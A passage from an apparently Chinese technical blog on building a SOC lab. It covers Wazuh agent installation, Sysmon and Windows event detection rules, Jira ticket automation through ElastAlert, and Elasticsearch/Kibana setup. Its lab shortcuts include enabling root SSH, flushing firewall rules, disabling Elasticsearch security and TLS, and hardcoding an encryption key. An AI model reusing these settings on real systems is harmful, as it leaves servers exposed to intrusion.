punctuation">.</span>msi <span class="token operator">-</span>OutFile $<span class="token punctuation">{</span>env:tmp<span class="token punctuation">}</span>\wazuh<span class="token operator">-</span>agent<span class="token punctuation">.</span>msi<span class="token punctuation">;</span> msiexec<span class="token punctuation">.</span>exe <span class="token operator">/</span>i $<span class="token punctuation">{</span>env:tmp<span class="token punctuation">}</span>\wazuh<span class="token operator">-</span>agent<span class="token punctuation">.</span>msi <span class="token operator">/</span>q WAZUH_MANAGER=<span class="token string">'192.168.137.134'</span> WAZUH_REGISTRATION_SERVER=<span class="token string">'192.168.137.134'</span> WAZUH_AGENT_GROUP=<span class="token string">'default'</span> WAZUH_AGENT_NAME=<span class="token string">'Win'</span> </code></pre><p>执行完成后，再执行 以下命令启动 wazuh agent即可</p><pre class="language-none"><code class="language-none">net start wazuh</code></pre><h3 id="2-Windows事件日志"><a href="#2-Windows事件日志" class="headerlink" title="2.Windows事件日志"></a>2.Windows事件日志</h3><h4 id="1-使用-Wazuh-直接监控进程创建（无需-Sysmon）"><a href="#1-使用-Wazuh-直接监控进程创建（无需-Sysmon）" class="headerlink" title="1.使用 Wazuh 直接监控进程创建（无需 Sysmon）"></a>1.使用 Wazuh 直接监控进程创建（无需 Sysmon）</h4><p>powershell执行</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">auditpol <span class="token operator">/</span><span class="token function">set</span> <span class="token operator">/</span>subcategory:<span class="token string">"{0CCE922B-69AE-11D9-BED3-505054503030}"</span> <span class="token operator">/</span>success:enable <span class="token operator">/</span>failure:enable</code></pre><p>查询是否设置成功</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">auditpol <span class="token operator">/</span>get <span class="token operator">/</span>subcategory:<span class="token string">"{0CCE922B-69AE-11D9-BED3-505054503030}"</span></code></pre><p><img src="/assets/image-20250720131243299.png" alt="image-20250720131243299"></p><p>在wazuh manager配置rule采集 ID 4688事件日志，</p><p><code>vim /var/ossec/etc/rules/local_rules.xml</code></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>windows,audit,<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100100<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>60103<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>win.system.eventID<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^4688$<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Windows: A new process has been created<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">&gt;</span></span></code></pre><p>重启wazuh manager</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl restart wazuh-manager</code></pre><p>默认情况下agent 是采集了日志（如果没有采集可以使用以下 agent.conf），需要manager有decoder 解析，由rule 进行规则判断</p><pre class="language-none"><code class="language-none">&lt;localfile&gt;  &lt;location&gt;Security&lt;/location&gt;  &lt;log_format&gt;eventchannel&lt;/log_format&gt;&lt;/localfile&gt;</code></pre><p><img src="/assets/image-20250720144825809.png" alt="image-20250720144825809"></p><h4 id="2-使用Sysmon-Wazuh-监控进程-网络创建"><a href="#2-使用Sysmon-Wazuh-监控进程-网络创建" class="headerlink" title="2.使用Sysmon+ Wazuh 监控进程/网络创建"></a>2.使用Sysmon+ Wazuh 监控进程/网络创建</h4><h5 id="1-下载和安装-Sysmon"><a href="#1-下载和安装-Sysmon" class="headerlink" title="1.下载和安装 Sysmon"></a>1.下载和安装 Sysmon</h5><pre class="language-none"><code class="language-none"># 下载 SysmonInvoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"Expand-Archive -Path "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\Sysmon"Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "$env:TEMP\sysmonconfig.xml"# 安装 Sysmon（需要管理员权限）cd "$env:TEMP\Sysmon".\Sysmon.exe -accepteula -i "$env:TEMP\sysmonconfig.xml".\Sysmon.exe -c "$env:TEMP\sysmonconfig.xml"</code></pre><h5 id="2-配置-Wazuh-Agent-收集-Sysmon-日志"><a href="#2-配置-Wazuh-Agent-收集-Sysmon-日志" class="headerlink" title="2. 配置 Wazuh Agent 收集 Sysmon 日志"></a>2. 配置 Wazuh Agent 收集 Sysmon 日志</h5><p>编辑 Wazuh Agent 配置文件 (<code>C:\Program Files (x86)\ossec-agent\ossec.conf</code>)：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ossec_config</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>localfile</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>location</span><span class="token punctuation">&gt;</span></span>Microsoft-Windows-Sysmon/Operational<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>location</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>log_format</span><span class="token punctuation">&gt;</span></span>eventchannel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>log_format</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>localfile</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ossec_config</span><span class="token punctuation">&gt;</span></span></code></pre><h5 id="3-添加-Wazuh-规则解码-Sysmon-事件"><a href="#3-添加-Wazuh-规则解码-Sysmon-事件" class="headerlink" title="3.添加 Wazuh 规则解码 Sysmon 事件"></a>3.添加 Wazuh 规则解码 Sysmon 事件</h5><p>解码器 local_decoder.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sysmon-full<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>windows<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prematch</span><span class="token punctuation">&gt;</span></span>^Microsoft-Windows-Sysmon<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prematch</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span></code></pre><p>rule： local_rules.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sysmon,<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 通用规则：记录所有 Sysmon 事件 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100100<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_group</span><span class="token punctuation">&gt;</span></span>sysmon<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_group</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Sysmon: Generic Event - $(win.system.eventID)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 为关键事件设置更高等级 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100101<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>win.system.eventID<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^1$<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Sysmon: Process Creation - $(win.eventdata.Image)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100102<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>100100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>win.system.eventID<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^3$<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Sysmon: Network Connection - $(win.eventdata.DestinationIp)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">&gt;</span></span></code></pre><h5 id="4-重启wazuh-manager-agent"><a href="#4-重启wazuh-manager-agent" class="headerlink" title="4.重启wazuh manager/agent"></a>4.重启wazuh manager/agent</h5><pre class="language-bash" data-language="bash"><code class="language-bash">Restart-Service -Name wazuhsystemctl restart wazuh-manager</code></pre><p>即可在kibana上看到相应日志</p><p><img src="/assets/image-20250720164646594.png" alt="image-20250720164646594"></p><p>匹配ipconfig.exe 告警示例</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sysmon,sysmon_eid1_detections,windows,<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100300<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>61603<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>win.eventdata.image<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>(?i)ipconfig\.exe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>options</span><span class="token punctuation">&gt;</span></span>no_full_log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>options</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>cmd run on host<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">&gt;</span></span></code></pre><p><img src="/assets/image-20250720172622807.png" alt="image-20250720172622807"></p><h3 id="3-Syslog-本地文件"><a href="#3-Syslog-本地文件" class="headerlink" title="3.Syslog/本地文件"></a>3.Syslog/本地文件</h3><p>使用远程 agent.conf 管理,需要注意本地需要 有权限，才能够正常读取</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>agent_config</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>localfile</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>location</span><span class="token punctuation">&gt;</span></span>C:\Users\admin\AppData\Local\Temp\a.txt<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>location</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>log_format</span><span class="token punctuation">&gt;</span></span>syslog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>log_format</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>only-future-events</span><span class="token punctuation">&gt;</span></span>yes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>only-future-events</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>localfile</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>agent_config</span><span class="token punctuation">&gt;</span></span></code></pre><img src="/assets/image-20250720182220366.png" alt="image-20250720182220366" style="zoom:80%;"><p><img src="/assets/image-20250720182401352.png" alt="image-20250720182401352"></p><h1 id="0x08-Jira联动"><a href="#0x08-Jira联动" class="headerlink" title="0x08 Jira联动"></a>0x08 Jira联动</h1><p>安装过程此处暂时省略，使用 JIRA cloud 在线环境</p><h3 id="1-创建JRIA项目"><a href="#1-创建JRIA项目" class="headerlink" title="1.创建JRIA项目"></a>1.创建JRIA项目</h3><p>JIRA 大致步骤：</p><ol><li>创建项目</li><li>创建字段及字段方案</li><li>创建工作流工作流方案</li><li>创建屏幕及屏幕方案</li><li>人员、权限</li><li>API服务</li></ol><p>浅浅配置一下，大概如图。</p><p><img src="/assets/image-20231012123334491.png" alt="image-20231012123334491"></p><p>需求：</p><blockquote><p>我们需要自动将 wazuh alerts中rule.level &gt; = 10 的 日志创建为一张ticket</p></blockquote><p>方案有几种：</p><ol><li>使用脚本调用ES API查询数据，再请求 JIRA API 创建Ticket</li><li>使用 kibana 自带 security/watcher 功能创建rule，并配置webhook、JRIA action，创建ticket</li><li>使用 Elastalert，并调用脚本请求JIRA api创建ticket</li></ol><p>需要使用到两个东西，一个是调用JIRA API，创建ticket ，参考文档</p><p><a href="https://developer.atlassian.com/cloud/jira/platform/rest/v2/intro/#authentication">https://developer.atlassian.com/cloud/jira/platform/rest/v2/intro/#authentication</a></p><p>快速上手：参考 <a href="https://juejin.cn/post/7023617578324983839">https://juejin.cn/post/7023617578324983839</a></p><p>另一个是使用脚本查询Elasticsearch，参考文档</p><h3 id="2-使用jIRA创建一个-Token"><a href="#2-使用jIRA创建一个-Token" class="headerlink" title="2.使用jIRA创建一个 Token"></a>2.使用jIRA创建一个 Token</h3><p><img src="/assets/image-20231012124606703.png" alt="image-20231012124606703"></p><p>构造认证头</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> -n user@example.com:api_token_string <span class="token operator">|</span> base64</code></pre><p>构造 查询 请求测试</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> --location --request GET <span class="token string">'https://aspirepigsoc.atlassian.net/rest/api/2/search?jql=project%20%3D%20SOC'</span> <span class="token punctuation">\</span>--header <span class="token string">'Authorization: Basic YXNwaXJlcGlxxxxx'</span> <span class="token punctuation">\</span>--header <span class="token string">'Accept: application/json'</span> <span class="token punctuation">\</span>--header <span class="token string">'Content-Type: application/json'</span> <span class="token punctuation">\</span></code></pre><p>测试能否正常调用API接口创建Ticket</p><pre class="language-none"><code class="language-none">curl --location --request POST 'https://aspirepigsoc.atlassian.net/rest/api/2/issue' \--header 'Accept: application/json' \--header 'Content-Type: application/json' \--header 'Authorization: Basic YXNwaXJlcxxxx' \--data-raw '{  "fields": {    "issuetype": {      "id": "10010"    },    "project": {      "id": "10001"    },    "summary": "test alert001",    "description": "Description - Hevo is a No Code Data Pipeline"  }}'</code></pre><p><img src="/assets/image-20231012133348832.png" alt="image-20231012133348832"></p><h3 id="3-elastalert2安装与配置"><a href="#3-elastalert2安装与配置" class="headerlink" title="3.elastalert2安装与配置"></a>3.elastalert2安装与配置</h3><p>查看文档进行安装：<a href="https://elastalert2.readthedocs.io/en/latest/running_elastalert.html#as-a-docker-container">https://elastalert2.readthedocs.io/en/latest/running_elastalert.html#as-a-docker-container</a></p><p>由于需要使用 Python 3.11 ，此处使用 docker 安装方法.配置如下</p><pre class="language-none"><code class="language-none">#安装dockerapt install docker.io</code></pre><p>创建目录: <code>/opt/elastalert/</code></p><p>elastalert.yaml：</p><pre class="language-none"><code class="language-none">rules_folder: /opt/elastalert/rulesrun_every:  seconds: 30buffer_time:  minutes: 15es_host: 192.168.137.134es_port: 9200writeback_index: elastalert_statusalert_time_limit:  days: 2</code></pre><p>soc.yaml</p><pre class="language-none"><code class="language-none">name: "soc"type: "any"index: "wazuh-alerts-4.x*"is_enabled: truerealert:  minutes: 0buffer_time:  minutes: 120filter:- range:    rule.level:      from: 9      to: 15include: ["rule.description", "full_log"]alert:  - command  - debugcommand: ["python3","/opt/elastalert/rules/test.py","{rule[description]}", "{full_log}"]</code></pre><p>test.py</p><pre class="language-none"><code class="language-none">import sysimport requestsimport jsonurl = "https://aspirepigsoc.atlassian.net/rest/api/2/issue"payload = json.dumps({  "fields": {    "issuetype": {      "id": "10010"    },    "project": {      "id": "10001"    },    "summary": sys.argv[1],    "description": sys.argv[2]  }})headers = {  'Accept': 'application/json',  'Content-Type': 'application/json',  'Authorization': 'Basic YXNwaXJlcGlnQGxxxx'}response = requests.request("POST", url, headers=headers, data=payload)print(response.text)</code></pre><p>创建完成后，启动容器</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml">cd /opt/elastalert<span class="token comment">#启动</span>docker run <span class="token punctuation">-</span>d <span class="token punctuation">-</span><span class="token punctuation">-</span>name elastalert <span class="token punctuation">-</span><span class="token punctuation">-</span>restart=always \<span class="token punctuation">-</span>v $(pwd)/elastalert.yaml<span class="token punctuation">:</span>/opt/elastalert/config.yaml \<span class="token punctuation">-</span>v $(pwd)/rules<span class="token punctuation">:</span>/opt/elastalert/rules \jertel/elastalert2 <span class="token punctuation">-</span><span class="token punctuation">-</span>verbose<span class="token comment">#查看日志，或者在kibana查看(成功的前提下)</span>docker logs <span class="token punctuation">-</span>f elastalert</code></pre><p>触发指定level的日志，查看是否正常创建 Ticket</p><p><img src="/assets/image-20231012172806105.png" alt="image-20231012172806105"></p><p>到目前，已经可以自动化创建 Ticket 了，如果需要补充更多字段，就得需要更多时间去完成日志源，做wazuh 的decoder、ruleset， 做JIRA的页面显示自动化、字段、页面配置、做Elastalert的配置字段优化等等</p>]]></content>
      
      
      
        <tags>
            
            <tag> elk </tag>
            
            <tag> soc </tag>
            
            <tag> wazuh </tag>
            
            <tag> JIRA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SOC_ES8</title>
      <link href="/2023/10/11/soc-es8/"/>
      <url>/2023/10/11/soc-es8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h1><p>搭建SOC完整架构尝试</p><p>架构图如下</p><p><img src="/assets/image-20231011175154949.png" alt="image-20231011175154949"></p><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><p>概述</p><pre class="language-none"><code class="language-none">VM1:Ubuntu 22.04.3 LTS</code></pre><h1 id="0x02-Ubuntu-VM安装"><a href="#0x02-Ubuntu-VM安装" class="headerlink" title="0x02 Ubuntu VM安装"></a>0x02 Ubuntu VM安装</h1><p>此处不做过多详细介绍，网上教程很多</p><p>下载 ISO <a href="https://releases.ubuntu.com/22.04/ubuntu-22.04.3-live-server-amd64.iso.torrent">https://releases.ubuntu.com/22.04/ubuntu-22.04.3-live-server-amd64.iso.torrent</a></p><p>下载后在 VMware 中安装，配置如图</p><img src="/assets/image-20231011164338357.png" alt="image-20231011164338357" style="zoom: 80%;"><p>安装过程中，记得安装 openssh 服务，完成安装后，修改 Root 可SSH 登陆。</p><pre class="language-bash" data-language="bash"><code class="language-bash">root@soc:~<span class="token comment"># cat /etc/ssh/sshd_config | grep -i root</span>PermitRootLogin <span class="token function">yes</span><span class="token comment">#修改时区</span>timedatectl set-timezone Asia/Shanghaisystemctl restart systemd-timesyncd<span class="token comment">#清除所有防火墙规则</span>ufw disableiptables -Fiptables -X</code></pre><h1 id="0x03-ES-Kibana-安装"><a href="#0x03-ES-Kibana-安装" class="headerlink" title="0x03 ES+Kibana 安装"></a>0x03 ES+Kibana 安装</h1><p>经过查询官方文档 <a href="https://documentation.wazuh.com/current/integrations-guide/index.html">https://documentation.wazuh.com/current/integrations-guide/index.html</a> 和<a href="https://documentation.wazuh.com/4.5/deployment-options/elastic-stack/index.html">https://documentation.wazuh.com/4.5/deployment-options/elastic-stack/index.html</a> 得知， filebeat集成的方式仅支持 到Wazuh 4.5.3 and Elastic Stack 7.17.13</p><p>高于次版本需使用 Logstash 进行集成</p><p>本文安装 ES Kibana 均为 8.x</p><h3 id="1-ElasticSearch-安装"><a href="#1-ElasticSearch-安装" class="headerlink" title="1. ElasticSearch 安装"></a>1. ElasticSearch 安装</h3><p>访问 <a href="https://www.elastic.co/cn/downloads/elasticsearch">https://www.elastic.co/cn/downloads/elasticsearch</a> ，点击页面中apt-get 按钮</p><p>或直接访问 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/8.10/deb.html#deb-repo">https://www.elastic.co/guide/en/elasticsearch/reference/8.10/deb.html#deb-repo</a></p><p>根据文档执行下列命令</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch <span class="token operator">|</span> <span class="token function">sudo</span> gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> apt-transport-https<span class="token builtin class-name">echo</span> <span class="token string">"deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/elastic-8.x.list<span class="token function">sudo</span> <span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> elasticsearch</code></pre><p>配置yml文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/elasticsearch/elasticsearch.yml<span class="token comment">#内容如下，修改 两个true 到 false，否则需要使用 https并需要输入密码</span><span class="token comment"># Enable security features</span>xpack.security.enabled: <span class="token boolean">false</span>xpack.security.enrollment.enabled: <span class="token boolean">true</span><span class="token comment"># Enable encryption for HTTP API client connections, such as Kibana, Logstash, and Agents</span>xpack.security.http.ssl:  enabled: <span class="token boolean">false</span>  keystore.path: certs/http.p12</code></pre><p>操作 elasticsearch</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#设置开机自启</span>systemctl <span class="token builtin class-name">enable</span> elasticsearch.service<span class="token comment">#启动 es</span>systemctl start elasticsearch.service<span class="token comment">#停止es</span>systemctl stop elasticsearch.service<span class="token comment">#查看es状态</span>systemctl status elasticsearch.service</code></pre><p>访问测试：</p><p><img src="/assets/image-20231011171150000.png" alt="image-20231011171150000"></p><h4 id="2-Kibana安装"><a href="#2-Kibana安装" class="headerlink" title="2.Kibana安装"></a>2.Kibana安装</h4><p>访问 <a href="https://www.elastic.co/cn/downloads/kibana%EF%BC%8C%E7%82%B9%E5%87%BB%E9%A1%B5%E9%9D%A2%E4%B8%ADapt-get">https://www.elastic.co/cn/downloads/kibana，点击页面中apt-get</a> 按钮</p><p>或直接访问 <a href="https://www.elastic.co/guide/en/kibana/8.10/deb.html#deb-repo">https://www.elastic.co/guide/en/kibana/8.10/deb.html#deb-repo</a></p><p>根据文档执行下列命令**(安装ES的时候已经执行过，这无需执行这几行，直接执行最后一行安装即可)**</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#</span><span class="token function">wget</span> -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch <span class="token operator">|</span> <span class="token function">sudo</span> gpg --dearmor -o /usr/share/keyrings/elasticsearch-keyring.gpg<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> apt-transport-https<span class="token builtin class-name">echo</span> <span class="token string">"deb [signed-by=/usr/share/keyrings/elasticsearch-keyring.gpg] https://artifacts.elastic.co/packages/8.x/apt stable main"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/elastic-8.x.list<span class="token function">sudo</span> <span class="token function">apt-get</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> kibana</code></pre><p>配置yml文件</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#cat /etc/kibana/kibana.yml</span>server.port: <span class="token number">5601</span>server.host: <span class="token string">"0.0.0.0"</span>server.name: <span class="token string">"kibana"</span>elasticsearch.hosts: <span class="token punctuation">[</span><span class="token string">"http://localhost:9200"</span><span class="token punctuation">]</span>xpack.encryptedSavedObjects.encryptionKey: iGhu317CGomTQ3UH1nQwYF7yZ8asWPKHHYMwjBUJxpack.security.encryptionKey: iGhu317CGomTQ3UH1nQwYF7yZ8asWPKHHYMwjBUJxpack.reporting.encryptionKey: iGhu317CGomTQ3UH1nQwYF7yZ8asWPKHHYMwjBUJi18n.locale: <span class="token string">"zh-CN"</span>logging:  appenders:    file:      type: <span class="token function">file</span>      fileName: /var/log/kibana/kibana.log      layout:        type: json  root:    appenders:      - default      - <span class="token function">file</span>pid.file: /run/kibana/kibana.pid</code></pre><p>操作 elasticsearch</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#设置开机自启</span>systemctl <span class="token builtin class-name">enable</span> kibana.service<span class="token comment">#启动 es</span>systemctl start kibana.service<span class="token 